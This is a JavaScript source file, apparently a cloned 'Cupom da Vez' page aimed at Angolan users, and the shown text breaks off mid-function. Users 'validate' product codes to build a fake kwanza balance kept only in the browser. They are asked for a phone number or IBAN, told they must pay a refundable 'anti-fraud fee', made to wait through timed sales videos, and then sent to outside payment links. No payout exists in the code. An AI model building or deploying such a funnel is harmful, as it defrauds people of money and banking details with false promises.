/* ===== MINHAVEZ - Exact Clone ===== */
const PRODUCTS = [
  { id: 1, brand: "Nike", product: "Nike Air Force (Black)", code: "96714954", value: 10500, image: "https://horizons-cdn.hostinger.com/3750fcf7-2e15-49f4-9407-69873196af8a/b5449f3a92f476905318a21c0a5f4aea.webp" },
  { id: 2, brand: "Nike", product: "Nike Air Force (Rosa)", code: "87526465", value: 12000, image: "https://horizons-cdn.hostinger.com/3750fcf7-2e15-49f4-9407-69873196af8a/a621a24909417901e1ba3b787e8d259b.webp" },
  { id: 3, brand: "JBL", product: "JBL Caixa de Som", code: "94141786", value: 21000, image: "https://horizons-cdn.hostinger.com/3750fcf7-2e15-49f4-9407-69873196af8a/8ff68eb842adee5d416e83d7388a0bd5.webp" },
  { id: 4, brand: "Riachuelo", product: "Sapato de Salto", code: "66777793", value: 15000, image: "https://horizons-cdn.hostinger.com/3750fcf7-2e15-49f4-9407-69873196af8a/28363d3c2fc37fedb1911e0039deb7c0.webp" },
  { id: 5, brand: "Samsung", product: "Samsung Galaxy", code: "67661371", value: 25000, image: "https://horizons-cdn.hostinger.com/3750fcf7-2e15-49f4-9407-69873196af8a/113a782acf4fea572b03eeee82fa74aa.webp" },
  { id: 6, brand: "Samsung", product: "Samsung Galaxy (Light Blue)", code: "81795889", value: 18000, image: "https://horizons-cdn.hostinger.com/3750fcf7-2e15-49f4-9407-69873196af8a/8ec60d140da3cadb6ac0b9181ea8e59c.webp" }
];
const CHECKOUT_BASE = "https://pay.kursinha.com/c/698c7534c2254ff1c42f89af";
const root = document.getElementById('root');
let displayedBal = 0, animF = null;

function fmt(v) { return v.toLocaleString() + ' Kz'; }
function fmtAOA(v) { return v.toLocaleString('pt-BR', { style: 'currency', currency: 'AOA' }).replace('AOA', 'Kz'); }
function getBal() { return parseInt(localStorage.getItem('totalBalance') || '0'); }
function setBal(v) { localStorage.setItem('totalBalance', v.toString()); }
function getName() { return localStorage.getItem('userName') || 'Usuário'; }
function firstName() { return getName().split(' ')[0]; }
function playKa() { try { const a = document.getElementById('kaching'); if (a) { a.currentTime = 0; a.play().catch(() => { }) } } catch (e) { } }
function animBal(from, to, el) {
  if (animF) cancelAnimationFrame(animF);
  const s = performance.now(), d = 800;
  const step = (now) => { const p = Math.min((now - s) / d, 1); const ease = 1 - Math.pow(1 - p, 3); el.textContent = fmt(Math.round(from + (to - from) * ease)); if (p < 1) animF = requestAnimationFrame(step); };
  animF = requestAnimationFrame(step);
}
function getUtms() {
  const p = new URLSearchParams(window.location.search);
  if (window.utmify && typeof window.utmify.getUtms === 'function') { try { const u = window.utmify.getUtms(); if (u) Object.keys(u).forEach(k => { if (u[k] && !p.has(k)) p.set(k, u[k]) }) } catch (e) { } }
  return p.toString();
}
function navigate(path) { window.location.hash = path; }
function getRoute() { return window.location.hash.replace('#', '') || '/'; }

// ===== ICONS =====
const ICO = {
  check: '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M5 13l4 4L19 7"/></svg>',
  checkCircle: '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>',
  shield: '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>',
  alert: '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>',
  gift: '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="8" width="18" height="4" rx="1"/><path d="M12 8v13"/><path d="M19 12v7a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2v-7"/><path d="M7.5 8a2.5 2.5 0 0 1 0-5A4.8 8 0 0 1 12 8a4.8 8 0 0 1 4.5-5 2.5 2.5 0 0 1 0 5"/></svg>',
};

function logoHTML(sz = 'text-3xl', coinSz = 'w-8 h-8', subSz = 'text-sm') {
  return `<div style="display:flex;align-items:center;justify-content:center;margin-bottom:24px">
    <h1 style="font-size:${sz === 'text-3xl' ? '30px' : '24px'};font-weight:900;color:#000">cupom</h1>
    <div style="width:${coinSz === 'w-8 h-8' ? '32px' : '24px'};height:${coinSz === 'w-8 h-8' ? '32px' : '24px'};background:#facc15;border-radius:50%;display:flex;align-items:center;justify-content:center;margin-left:4px">
      <span style="color:#000;font-weight:700;font-size:${coinSz === 'w-8 h-8' ? '14px' : '12px'}">$</span>
    </div>
    <div style="margin-left:8px"><span style="font-size:${subSz === 'text-sm' ? '14px' : '11px'};font-weight:500;color:#6b7280;display:block;line-height:1.1">DA VEZ</span></div>
  </div>`;
}
function headerHTML(bal) {
  return `<div style="display:flex;justify-content:space-between;align-items:center;padding:16px;background:#fff">
    <div style="display:flex;align-items:center">
      <h1 style="font-size:24px;font-weight:900;color:#000">cupom</h1>
      <div style="width:24px;height:24px;background:#facc15;border-radius:50%;display:flex;align-items:center;justify-content:center;margin-left:4px"><span style="color:#000;font-weight:700;font-size:12px">$</span></div>
      <div style="margin-left:4px"><span style="font-size:12px;font-weight:500;color:#6b7280;display:block;line-height:1.1">DA VEZ</span></div>
    </div>
    <div style="text-align:right">
      <p style="font-size:14px;color:#6b7280">Olá, ${firstName()}</p>
      <p style="font-size:18px;font-weight:700;color:#ca8a04" id="hBal">${fmt(bal)}</p>
    </div>
  </div>`;
}
function progressDots(cur) {
  let h = '<div style="display:flex;gap:8px;justify-content:center;margin:16px 0">';
  for (let i = 1; i <= 6; i++) {
    const bg = i < cur ? '#4caf50' : i === cur ? '#ffd700' : '#e0e0e0';
    h += `<div style="width:12px;height:12px;border-radius:50%;background:${bg};transition:all .3s"></div>`;
  }
  return h + '</div>';
}

function showToast(title, msg, type) {
  let t = document.getElementById('tc');
  if (!t) { t = document.createElement('div'); t.id = 'tc'; t.style.cssText = 'position:fixed;top:16px;right:16px;z-index:100;max-width:360px;width:90%'; document.body.appendChild(t); }
  const el = document.createElement('div');
  el.style.cssText = `background:${type === 'error' ? '#fef2f2' : '#f0fdf4'};border:1px solid ${type === 'error' ? '#fecaca' : '#bbf7d0'};border-radius:12px;padding:16px;margin-bottom:8px;box-shadow:0 10px 15px rgba(0,0,0,.1);animation:slideUp .3s ease-out`;
  el.innerHTML = `<p style="font-weight:600;color:${type === 'error' ? '#dc2626' : '#16a34a'};margin-bottom:4px">${title}</p><p style="font-size:14px;color:#6b7280">${msg}</p>`;
  t.appendChild(el); setTimeout(() => { el.style.opacity = '0'; el.style.transition = 'opacity .3s'; setTimeout(() => el.remove(), 300) }, 3000);
}

// ===== HOME =====
function renderHome() {
  root.innerHTML = `<div class="mobile-container"><div style="min-height:100vh;display:flex;flex-direction:column;background:#fff">
    <div style="text-align:center;padding:32px 24px">${logoHTML()}</div>
    <div style="flex:1;padding:0 24px;display:flex;flex-direction:column;justify-content:center">
      <div style="text-align:center;margin-bottom:32px">
        <h2 style="font-size:30px;font-weight:700;color:#111827;margin-bottom:16px">Bem-vindo!</h2>
        <p style="font-size:18px;color:#6b7280;margin-bottom:8px">Que tal fazermos uma renda extra juntos?</p>
        <p style="font-size:16px;color:#9ca3af;font-weight:500">Chega mais!</p>
      </div>
      <div style="margin-bottom:32px">
        <button id="startBtn" style="width:100%;background:#facc15;color:#000;font-weight:700;padding:16px 24px;border:none;border-radius:16px;font-size:18px;cursor:pointer;box-shadow:0 10px 15px rgba(0,0,0,.1);display:flex;align-items:center;justify-content:space-between">
          <div style="display:flex;align-items:center">
            <div style="width:32px;height:32px;background:#000;border-radius:50%;display:flex;align-items:center;justify-content:center;margin-right:12px"><span style="color:#fff;font-weight:700;font-size:14px">1</span></div>
            <span>Começar Agora</span>
          </div>
          <span style="font-size:20px">→</span>
        </button>
      </div>
      <p style="text-align:center;color:#9ca3af;font-size:14px;margin-bottom:32px">É simples, rápido e sem complicações.</p>
      <div style="background:#f9fafb;border-radius:16px;padding:16px;margin-bottom:32px;opacity:.6">
        <div style="display:flex;align-items:center;justify-content:space-between">
          <div style="display:flex;align-items:center">
            <div style="width:32px;height:32px;background:#d1d5db;border-radius:50%;display:flex;align-items:center;justify-content:center;margin-right:12px"><span style="color:#6b7280;font-weight:700;font-size:14px">2</span></div>
            <div><h3 style="font-weight:600;color:#374151">Realize seu saque</h3><p style="font-size:14px;color:#9ca3af">Aumente seu saldo para realizar seu primeiro saque.</p></div>
          </div>
          <span style="color:#d1d5db">→</span>
        </div>
      </div>
    </div>
    <div style="padding:0 24px 32px">
      <div style="display:flex;justify-content:center;margin-bottom:16px;gap:16px">
        <div style="width:48px;height:48px;background:#dcfce7;border-radius:50%;display:flex;align-items:center;justify-content:center"><span style="color:#16a34a">${ICO.shield}</span></div>
        <div style="width:48px;height:48px;background:#fee2e2;border-radius:50%;display:flex;align-items:center;justify-content:center"><span style="color:#dc2626">${ICO.checkCircle}</span></div>
        <div style="width:48px;height:48px;background:#dcfce7;border-radius:50%;display:flex;align-items:center;justify-content:center"><span style="color:#16a34a">${ICO.checkCircle}</span></div>
      </div>
      <div style="text-align:center">
        <h3 style="font-weight:700;color:#111827;margin-bottom:8px">Suas informações estão 100% protegidas!</h3>
        <p style="font-size:14px;color:#6b7280;margin-bottom:4px">Este site é seguro e possui Certificado SSL.</p>
        <p style="font-size:14px;color:#6b7280">Sua privacidade é totalmente garantida por nossa política de segurança.</p>
      </div>
    </div>
  </div></div>`;
  document.getElementById('startBtn').onclick = () => navigate('/identificacao');
}

// ===== IDENTIFICACAO =====
function renderIdentificacao() {
  root.innerHTML = `<div class="mobile-container"><div style="min-height:100vh;display:flex;flex-direction:column;background:#fff">
    <div style="text-align:center;padding:32px 24px">${logoHTML()}</div>
    <div style="flex:1;padding:0 24px;display:flex;flex-direction:column;justify-content:center">
      <div style="text-align:center;margin-bottom:32px">
        <h2 style="font-size:24px;font-weight:700;color:#111827;margin-bottom:16px">Olá! Como você se chama?</h2>
        <p style="color:#6b7280">Vamos personalizar sua experiência</p>
      </div>
      <div style="margin-bottom:24px">
        <input type="text" id="nameInp" placeholder="Digite seu nome" maxlength="50" style="width:100%;padding:16px;border:2px solid #e5e7eb;border-radius:16px;font-size:18px;outline:none;font-family:inherit;box-sizing:border-box;transition:border-color .3s" onfocus="this.style.borderColor='#facc15'" onblur="this.style.borderColor='#e5e7eb'">
      </div>
      <div style="margin-bottom:32px">
        <button id="idBtn" style="width:100%;background:#facc15;color:#000;font-weight:700;padding:16px 24px;border:none;border-radius:16px;font-size:18px;cursor:pointer;box-shadow:0 10px 15px rgba(0,0,0,.1)">Continuar</button>
      </div>
      <p style="text-align:center;font-size:14px;color:#9ca3af;padding:0 16px">Ao continuar, você concorda com nossos termos de uso</p>
    </div>
  </div></div>`;
  const saved = localStorage.getItem('userName');
  if (saved) document.getElementById('nameInp').value = saved;
  document.getElementById('idBtn').onclick = () => {
    const n = document.getElementById('nameInp').value.trim();
    if (!n) { showToast('Nome obrigatório', 'Por favor, digite seu nome para continuar.', 'error'); return; }
    localStorage.setItem('userName', n); localStorage.removeItem('totalBalance'); displayedBal = 0;
    navigate('/validacao/1');
  };
}

// ===== VALIDACAO =====
function renderValidacao(step) {
  const idx = step - 1;
  if (idx < 0 || idx >= PRODUCTS.length) { navigate('/limite-atingido'); return; }
  const p = PRODUCTS[idx], bal = getBal();
  root.innerHTML = `<div class="mobile-container"><div style="min-height:100vh;background:#fff">
    ${headerHTML(bal)}
    <div style="padding:0 16px 32px">
      <div style="text-align:center;margin-bottom:16px">
        <h2 style="font-size:20px;font-weight:700;color:#16a34a;margin-bottom:8px">NOVO CUPOM ENCONTRADO!</h2>
        ${progressDots(step)}
        <p style="color:#6b7280">Cupom ${step} de 6</p>
      </div>
      <div style="border-radius:20px;overflow:hidden;box-shadow:0 10px 30px rgba(0,0,0,.15);margin-bottom:24px;position:relative">
        <img src="${p.image}" alt="${p.product}" style="width:100%;height:256px;object-fit:contain;display:block;user-select:none;-webkit-user-drag:none" draggable="false">
      </div>
      <div style="margin-bottom:24px">
        <p style="text-align:center;color:#2563eb;margin-bottom:16px;display:flex;align-items:center;justify-content:center">
          <span style="margin-right:8px">⬇️</span>Digite o código da imagem acima<span style="margin-left:8px">⬇️</span>
        </p>
        <input type="number" inputmode="numeric" id="codeInp" placeholder="Digite os 8" maxlength="8" style="width:100%;padding:16px;border:2px solid #e5e7eb;border-radius:16px;font-size:18px;text-align:center;font-weight:700;outline:none;font-family:inherit;box-sizing:border-box;transition:border-color .3s" onfocus="this.style.borderColor='#facc15'" onblur="this.style.borderColor='#e5e7eb'">
      </div>
      <div style="text-align:center;margin-bottom:24px">
        <div style="display:flex;align-items:center;justify-content:center;margin-bottom:8px">
          <div style="width:24px;height:24px;background:#ef4444;border-radius:50%;display:flex;align-items:center;justify-content:center;margin-right:8px"><span style="color:#fff;font-size:12px">🎯</span></div>
          <span style="font-weight:600">${p.product}</span>
        </div>
        <p style="font-size:20px;font-weight:700;color:#ca8a04">Valor a ganhar: ${fmt(p.value)}</p>
      </div>
      <button id="valBtn" style="width:100%;background:#22c55e;color:#fff;font-weight:700;padding:16px 24px;border:none;border-radius:16px;font-size:18px;cursor:pointer;box-shadow:0 10px 15px rgba(0,0,0,.1)">Validar Cupão</button>
    </div>
  </div>
  <div id="modal" style="position:fixed;inset:0;background:rgba(0,0,0,.5);display:flex;align-items:center;justify-content:center;z-index:50;backdrop-filter:blur(4px);opacity:0;pointer-events:none;transition:all .3s">
    <div style="background:#fff;border-radius:24px;padding:32px;max-width:360px;width:90%;text-align:center;transform:scale(.9);transition:transform .3s" id="modalContent">
      <div style="width:96px;height:96px;background:#dcfce7;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 24px"><span style="color:#16a34a;width:48px;height:48px">${ICO.gift}</span></div>
      <h2 style="font-size:24px;font-weight:700;color:#111827;margin-bottom:16px">Nova Recompensa Desbloqueada!</h2>
      <p style="color:#6b7280;margin-bottom:8px">Você ganhou</p>
      <div style="font-size:36px;font-weight:700;color:#16a34a;margin-bottom:32px">Kz ${p.value.toLocaleString()}</div>
      <p style="color:#6b7280;margin-bottom:32px">Continue a avaliar para ganhar ainda mais!</p>
      <button id="contBtn" style="width:100%;background:#22c55e;color:#fff;font-weight:700;padding:16px 24px;border:none;border-radius:16px;font-size:18px;cursor:pointer;box-shadow:0 10px 15px rgba(0,0,0,.1)">Continuar</button>
    </div>
  </div></div>`;
  const ci = document.getElementById('codeInp');
  ci.addEventListener('input', e => { e.target.value = e.target.value.replace(/\D/g, '').slice(0, 8); });
  document.getElementById('valBtn').onclick = () => {
    const v = ci.value.trim();
    if (!v) { showToast('Código obrigatório', 'Por favor, digite o código do cupom.', 'error'); return; }
    if (v !== p.code) { showToast('Código incorreto', 'O código digitado não confere com o da imagem.', 'error'); ci.style.animation = 'shake .5s'; setTimeout(() => ci.style.animation = '', 500); return; }
    const nb = bal + p.value; setBal(nb); playKa();
    const hb = document.getElementById('hBal'); if (hb) animBal(bal, nb, hb);
    const m = document.getElementById('modal'), mc = document.getElementById('modalContent');
    m.style.opacity = '1'; m.style.pointerEvents = 'all'; mc.style.transform = 'scale(1)';
  };
  document.getElementById('contBtn').onclick = () => {
    const m = document.getElementById('modal'); m.style.opacity = '0'; m.style.pointerEvents = 'none';
    const next = step + 1; next <= 6 ? navigate('/validacao/' + next) : navigate('/limite-atingido');
  };
}

// ===== LIMITE ATINGIDO =====
function renderLimite() {
  const bal = getBal();
  root.innerHTML = `<div class="mobile-container"><div style="min-height:100vh;display:flex;flex-direction:column;background:#fff">
    <div style="text-align:center;padding:32px 24px">${logoHTML()}</div>
    <div style="flex:1;padding:0 24px;display:flex;flex-direction:column;justify-content:center">
      <div style="text-align:center;margin-bottom:32px">
        <h2 style="font-size:30px;font-weight:700;color:#111827;margin-bottom:16px">Limite Diário Atingido!</h2>
        <p style="color:#6b7280;margin-bottom:24px">Você atingiu o limite de cupões diários.</p>
        <div style="background:#f0fdf4;border:2px solid #bbf7d0;border-radius:16px;padding:24px;margin-bottom:32px">
          <p style="color:#6b7280;margin-bottom:8px">Saldo Total Acumulado:</p>
          <p style="font-size:36px;font-weight:700;color:#16a34a">${fmt(bal)}</p>
        </div>
        <div style="display:flex;align-items:center;justify-content:center;margin-bottom:32px">
          <span>⬇️</span><p style="color:#2563eb;font-weight:500;margin:0 8px">Realize o seu saque abaixo</p><span>⬇️</span>
        </div>
      </div>
      <button id="saqueBtn" style="width:100%;background:#facc15;color:#000;font-weight:700;padding:16px 24px;border:none;border-radius:16px;font-size:18px;cursor:pointer;box-shadow:0 10px 15px rgba(0,0,0,.1);animation:pulse 2s infinite">REALIZAR SAQUE</button>
    </div>
  </div></div>`;
  document.getElementById('saqueBtn').onclick = () => navigate('/metodo-saque');
}

// ===== METODO SAQUE =====
function renderMetodoSaque() {
  const bal = getBal(); let method = 'multicaixa';
  root.innerHTML = `<div class="mobile-container"><div style="min-height:100vh;background:#f9fafb;padding:16px">
    <div style="max-width:448px;margin:0 auto;background:#fff;border-radius:24px;box-shadow:0 20px 25px rgba(0,0,0,.1);overflow:hidden">
      <div style="padding:24px;text-align:center">
        <h1 style="font-size:24px;font-weight:700;color:#111827;margin-bottom:8px">Solicitar Saque</h1>
        <p style="color:#6b7280">Sistema de Pagamento Seguro</p>
      </div>
      <div style="background:#f0fdf4;padding:16px;margin:0 24px 24px;border-radius:16px;text-align:center">
        <p style="color:#6b7280;margin-bottom:4px">Valor Disponível:</p>
        <p style="font-size:30px;font-weight:700;color:#16a34a">Kz ${bal.toLocaleString()}</p>
      </div>
      <div style="padding:0 24px 24px">
        <h3 style="font-size:18px;font-weight:600;color:#111827;margin-bottom:16px">Escolha o método de saque:</h3>
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:24px">
          <div id="mIban" style="border:2px solid #e5e7eb;border-radius:16px;padding:16px;cursor:pointer;text-align:center;transition:all .3s" onclick="selMethod('iban')">
            <div style="margin-bottom:8px;color:#6b7280">${ICO.shield}</div>
            <p style="font-weight:600;color:#111827">IBAN Bancário</p>
          </div>
          <div id="mMulti" style="border:2px solid #3b82f6;background:#eff6ff;border-radius:16px;padding:16px;cursor:pointer;text-align:center;transition:all .3s" onclick="selMethod('multicaixa')">
            <div style="margin-bottom:8px;color:#6b7280">${ICO.shield}</div>
            <p style="font-weight:600;color:#111827">Multicaixa Express</p>
          </div>
        </div>
        <div id="inputArea">
          <label style="display:block;font-weight:600;font-size:14px;color:#374151;margin-bottom:8px">Número de Telefone (Express)</label>
          <input type="tel" id="accInp" placeholder="9XX XXX XXX" maxlength="9" style="width:100%;padding:16px;border:2px solid #e5e7eb;border-radius:16px;font-size:18px;outline:none;font-family:inherit;box-sizing:border-box;transition:border-color .3s" onfocus="this.style.borderColor='#3b82f6'" onblur="this.style.borderColor='#e5e7eb'">
        </div>
        <button id="confBtn" style="width:100%;background:#3b82f6;color:#fff;font-weight:700;padding:16px 24px;border:none;border-radius:16px;font-size:18px;cursor:pointer;box-shadow:0 10px 15px rgba(0,0,0,.1);margin-top:24px">💳 Confirmar e Sacar</button>
      </div>
    </div>
  </div></div>`;
  window.selMethod = function (m) {
    method = m;
    document.getElementById('mIban').style.borderColor = m === 'iban' ? '#3b82f6' : '#e5e7eb';
    document.getElementById('mIban').style.background = m === 'iban' ? '#eff6ff' : '#fff';
    document.getElementById('mMulti').style.borderColor = m === 'multicaixa' ? '#3b82f6' : '#e5e7eb';
    document.getElementById('mMulti').style.background = m === 'multicaixa' ? '#eff6ff' : '#fff';
    const ia = document.getElementById('inputArea');
    if (m === 'multicaixa') {
      ia.innerHTML = `<label style="display:block;font-weight:600;font-size:14px;color:#374151;margin-bottom:8px">Número de Telefone (Express)</label><input type="tel" id="accInp" placeholder="9XX XXX XXX" maxlength="9" style="width:100%;padding:16px;border:2px solid #e5e7eb;border-radius:16px;font-size:18px;outline:none;font-family:inherit;box-sizing:border-box" onfocus="this.style.borderColor='#3b82f6'" onblur="this.style.borderColor='#e5e7eb'">`;
    } else {
      ia.innerHTML = `<label style="display:block;font-weight:600;font-size:14px;color:#374151;margin-bottom:8px">Número IBAN (21 dígitos)</label><input type="text" id="accInp" placeholder="Digite o IBAN completo" maxlength="21" style="width:100%;padding:16px;border:2px solid #e5e7eb;border-radius:16px;font-size:18px;outline:none;font-family:inherit;box-sizing:border-box" onfocus="this.style.borderColor='#3b82f6'" onblur="this.style.borderColor='#e5e7eb'">`;
    }
    document.getElementById('accInp').addEventListener('input', e => { e.target.value = e.target.value.replace(/\D/g, '') });
  };
  document.getElementById('accInp')?.addEventListener('input', e => { e.target.value = e.target.value.replace(/\D/g, '') });
  document.getElementById('confBtn').onclick = () => {
    const v = document.getElementById('accInp').value;
    if (method === 'multicaixa' && (!v || v.length !== 9)) { showToast('Número inválido', 'Digite um número válido com 9 dígitos.', 'error'); return; }
    if (method === 'iban' && (!v || v.length !== 21)) { showToast('IBAN inválido', 'Digite um IBAN válido com 21 dígitos.', 'error'); return; }
    localStorage.setItem('withdrawalMethod', method); localStorage.setItem('withdrawalAccount', v);
    navigate('/confirmacao-seguranca');
  };
}

// ===== CONFIRMACAO SEGURANCA =====
function renderConfirmacao() {
  const bal = getBal();
  root.innerHTML = `<div class="mobile-container"><div style="min-height:100vh;background:#111827;display:flex;align-items:center;justify-content:center;padding:16px">
    <div style="max-width:400px;width:100%;background:#fff;border-radius:24px;box-shadow:0 25px 50px rgba(0,0,0,.25);overflow:hidden">
      <div style="background:linear-gradient(to right,#fb923c,#ef4444);padding:24px;text-align:center;color:#fff">
        <div style="width:48px;height:48px;margin:0 auto 8px;color:#fff">${ICO.shield}</div>
        <h1 style="font-size:20px;font-weight:700">🔒 Confirmação de Segurança Necessária</h1>
      </div>
      <div style="padding:24px">
        <div style="text-align:center;margin-bottom:24px">
          <p style="color:#6b7280;margin-bottom:8px">Antes de liberar o seu saque de</p>
          <div style="display:flex;align-items:center;justify-content:center;margin-bottom:16px">
            <span style="font-size:24px;margin-right:8px">💰</span>
            <span style="font-size:30px;font-weight:700;color:#16a34a">${fmt(bal)}</span>
          </div>
          <p style="color:#6b7280;font-size:14px">precisamos confirmar que você é uma pessoa real e não um robô.</p>
        </div>
        <div style="background:#f9fafb;border-radius:16px;padding:16px;margin-bottom:24px">
          <div style="display:flex;align-items:flex-start;gap:8px">
            <div style="width:20px;height:20px;flex-shrink:0;color:#6b7280">${ICO.shield}</div>
            <p style="font-size:14px;color:#374151;margin:0">Para isso, o sistema exige um cadastro de segurança (IBAN ou Número Express) com uma pequena taxa anti-fraude.</p>
          </div>
        </div>
        <div style="background:linear-gradient(135deg,#e8f5e8,#f0f8f0);border-left:4px solid #4caf50;border-radius:16px;padding:16px;margin-bottom:24px">
          <p style="font-weight:600;color:#1f2937;margin-bottom:12px">✅ Essa verificação existe para proteger o seu dinheiro contra:</p>
          <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px"><span style="color:#16a34a">${ICO.checkCircle}</span><span style="font-size:14px;color:#374151">Robôs automáticos que estavam explorando o sistema</span></div>
          <div style="display:flex;align-items:center;gap:8px"><span style="color:#16a34a">${ICO.checkCircle}</span><span style="font-size:14px;color:#374151">Cadastros falsos que tentavam sacar valores indevidos</span></div>
        </div>
        <div style="background:linear-gradient(135deg,#fff3cd,#ffeaa7);border-left:4px solid #f59e0b;border-radius:16px;padding:16px;margin-bottom:24px">
          <div style="display:flex;align-items:flex-start;gap:8px;margin-bottom:8px">
            <div style="width:20px;height:20px;flex-shrink:0;color:#d97706">${ICO.alert}</div>
            <span style="font-weight:600;color:#1f2937">Importante:</span>
          </div>
          <div style="margin-left:28px">
            <div style="display:flex;align-items:center;gap:8px;margin-bottom:4px"><span style="color:#16a34a">${ICO.checkCircle}</span><span style="font-size:14px;color:#374151">Essa taxa NÃO é um custo.</span></div>
            <div style="display:flex;align-items:center;gap:8px;margin-bottom:4px"><span style="color:#16a34a">${ICO.checkCircle}</span><span style="font-size:14px;color:#374151">Você recebe ela de volta junto com o valor do seu saque.</span></div>
            <div style="display:flex;align-items:center;gap:8px"><span style="color:#16a34a">${ICO.checkCircle}</span><span style="font-size:14px;color:#374151">Ou seja: o que é seu, volta garantido.</span></div>
          </div>
        </div>
        <div style="text-align:center;margin-bottom:24px">
          <p style="font-weight:600;color:#1f2937;margin-bottom:8px">👇 Próximo passo</p>
          <p style="font-size:14px;color:#6b7280">Clique no botão abaixo, ative o seu cadastro e libere agora mesmo o seu saque.</p>
        </div>
        <button id="ativarBtn" style="width:100%;background:linear-gradient(to right,#22c55e,#16a34a);color:#fff;font-weight:700;padding:16px 24px;border:none;border-radius:16px;font-size:18px;cursor:pointer;box-shadow:0 10px 15px rgba(0,0,0,.1);animation:pulse 2s infinite">Ativar Cadastro e Liberar Saque</button>
      </div>
    </div>
  </div></div>`;
  document.getElementById('ativarBtn').onclick = () => navigate('/final');
}

// ===== FINAL (VIDEO 16:9) =====
function renderFinal() {
  const bal = Math.min(getBal(), 200000);
  root.innerHTML = `<div class="mobile-container"><div style="min-height:100vh;display:flex;flex-direction:column;background:#fff">
    ${headerHTML(bal)}
    <main style="flex:1;padding:16px;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center">
      <div style="width:100%;max-width:640px;border-radius:16px;overflow:hidden;box-shadow:0 20px 25px rgba(0,0,0,.1);margin-bottom:24px">
        <div style="position:relative;padding-top:55.55%">
          <iframe src="https://player-vz-a11b5e43-1b7.tv.pandavideo.com.br/embed/?v=4e9cfff8-b59e-4dbd-8b4c-616e03b07404" allow="accelerometer;gyroscope;autoplay;encrypted-media;picture-in-picture" allowfullscreen style="position:absolute;top:0;left:0;width:100%;height:100%;border:none"></iframe>
        </div>
      </div>
      <div style="background:#fef3c7;border-left:4px solid #facc15;color:#92400e;padding:16px;border-radius:8px;display:flex;align-items:center;gap:12px;margin-bottom:24px;max-width:640px;width:100%">
        <div style="width:24px;height:24px;flex-shrink:0;color:#eab308">${ICO.alert}</div>
        <p style="font-weight:600;flex:1;text-align:center;margin:0">Assista esse vídeo até o final para liberar o seu saque!</p>
      </div>
      <p style="color:#9ca3af;font-size:14px;margin-top:auto;margin-bottom:16px">© ${new Date().getFullYear()} Todos os direitos reservados - Cupom da Vez</p>
    </main>
    <div style="position:sticky;bottom:0;padding:16px;background:rgba(255,255,255,.9);backdrop-filter:blur(8px)">
      <button id="sacarBtn" style="display:none;width:100%;background:#22c55e;color:#fff;font-weight:700;padding:24px;border:none;border-radius:16px;font-size:20px;cursor:pointer;box-shadow:0 10px 15px rgba(0,0,0,.1)">SACAR AGORA</button>
    </div>
  </div></div>`;
  setTimeout(() => { const b = document.getElementById('sacarBtn'); if (b) { b.style.display = 'block'; b.style.animation = 'slideUp .5s ease-out'; } }, 165000);
  document.getElementById('sacarBtn').onclick = () => navigate('/video-pagamento');
}

// ===== VIDEO PAGAMENTO (9:16) =====
function renderVideoPagamento() {
  const bal = Math.min(getBal(), 200000);
  root.innerHTML = `<div class="mobile-container"><div style="min-height:100vh;display:flex;flex-direction:column;background:#fff">
    ${headerHTML(bal)}
    <main style="flex:1;padding:16px;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center">
      <div style="width:100%;max-width:400px;border-radius:16px;overflow:hidden;box-shadow:0 20px 25px rgba(0,0,0,.1);margin-bottom:24px">
        <div style="position:relative;padding-top:177.78%">
          <iframe src="https://player-vz-a11b5e43-1b7.tv.pandavideo.com.br/embed/?v=82bb5601-05b2-4e24-886a-e469a880226a" allow="accelerometer;gyroscope;autoplay;encrypted-media;picture-in-picture" allowfullscreen style="position:absolute;top:0;left:0;width:100%;height:100%;border:none"></iframe>
        </div>
      </div>
      <div style="background:#fef3c7;border-left:4px solid #facc15;color:#92400e;padding:16px;border-radius:8px;display:flex;align-items:center;gap:12px;margin-bottom:24px;max-width:640px;width:100%">
        <div style="width:24px;height:24px;flex-shrink:0;color:#eab308">${ICO.alert}</div>
        <p style="font-weight:600;flex:1;text-align:center;margin:0">Assista esse vídeo até o final para liberar o seu saque!</p>
      </div>
      <p style="color:#9ca3af;font-size:14px;margin-top:auto;margin-bottom:16px">© ${new Date().getFullYear()} Todos os direitos reservados - Cupom da Vez</p>
    </main>
    <div style="position:sticky;bottom:0;padding:16px;background:rgba(255,255,255,.9);backdrop-filter:blur(8px)">
      <button id="sacarBtn2" style="display:none;width:100%;background:#22c55e;color:#fff;font-weight:700;padding:24px;border:none;border-radius:16px;font-size:20px;cursor:pointer;box-shadow:0 10px 15px rgba(0,0,0,.1)">SACAR AGORA</button>
    </div>
  </div></div>`;
  setTimeout(() => { const b = document.getElementById('sacarBtn2'); if (b) { b.style.display = 'block'; b.style.animation = 'slideUp .5s ease-out'; } }, 150000);
  document.getElementById('sacarBtn2').onclick = () => {
  window.location.href = "https://zenopayment.com/p/cupomdavez";
};
}

// ===== CHECKOUT =====
function renderCheckout() {
  const bal = Math.min(getBal(), 200000); let countdown = 1200;
  const utms = getUtms(); const checkoutUrl = CHECKOUT_BASE + (utms ? '?' + utms : '');
  root.innerHTML = `<div class="mobile-container"><div style="min-height:100vh;display:flex;flex-direction:column;background:#fff">
